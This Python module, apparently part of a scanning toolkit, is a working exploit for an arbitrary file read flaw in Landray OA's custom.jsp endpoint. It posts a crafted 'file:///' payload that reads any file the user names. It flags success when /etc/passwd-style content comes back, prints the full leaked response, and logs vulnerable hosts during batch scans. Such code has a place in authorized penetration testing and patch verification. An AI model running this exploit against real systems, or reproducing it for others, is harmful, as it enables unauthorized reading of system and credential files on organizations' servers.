#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile

urllib3.disable_warnings()

class LanlingDirReadScan:
    def __init__(self):
        self.proxy = None
        self.header = None
        self.ssl = None

    def run(self,url,data):
        header = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        try:
            response = requests.post(url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            if response.status_code == 200 and ':/root' in response.text:
                OutPrintInfoSuc("LanLing", f"存在蓝凌OA custom.jsp任意文件读取漏洞:{url}")
                if not self.batch:
                    OutPrintInfo("LanLing",f"响应体:\n{response.text}")
                else:
                    OutPutFile("lanling_custom_read_file.txt",f"存在蓝凌OA custom.jsp任意文件读取漏洞:{url}")
            else:
                if not self.batch:
                    OutPrintInfo("LanLing", "目标不存在该漏洞")

        except Exception:
            if not self.batch:
                OutPrintInfo("LanLing", "目标不存在该漏洞")
    def main(self, results):
        self.batch = results["batch_work"]
        url = results["url"].strip('/ ')
        file = results["file"]
        self.ssl = results["ssl"]
        self.header = results["header"]
        proxy = results["proxy"]

        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("LanLing","开始检测蓝凌OA custom.jsp 任意文件读取漏洞")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        data = 'var={"body":{"file":f"file:///%s"}}' % file

        self.run(new_url,data)
        if not self.batch:
            OutPrintInfo("LanLing","蓝凌OA custom.jsp 任意文件读取漏洞检测结束")